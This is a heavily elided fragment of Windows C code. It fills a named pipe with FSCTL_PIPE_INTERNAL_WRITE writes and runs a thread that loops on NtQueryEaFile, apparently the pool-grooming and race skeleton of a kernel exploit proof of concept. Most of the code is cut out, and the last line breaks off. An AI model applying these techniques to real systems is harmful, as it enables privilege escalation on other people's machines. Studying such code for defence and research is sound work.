...
VOID Save(ULONG Count)
{
    ...
    for (i = 0; i < Count; i++)
    {
        status = NtFsControlFile(wpipe, NULL, NULL, NULL, &iosb, FSCTL_PIPE_INTERNAL_WRITE, buf, sizeof(buf), NULL, 0);
...
Thrash(LPVOID arg)
{
    ...
    if (!arg)
    {
        ...
        while (1)
        {
            ...
            NtQueryEaFile(NULL, &iosb, NULL, 0, FALSE, &buf, sizeof(buf), NULL, FALSE);
        }
    }
    else
    {
...
int __cdecl main()
{
    ...
    wpipe = CreateNamedPipe("\\\\.\\pipe\\testpipe", PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
                            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, 1, 100, 100, 100000, NULL);
    ...
    rpipe = CreateFile("\\\\.\\pipe\\testpipe", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
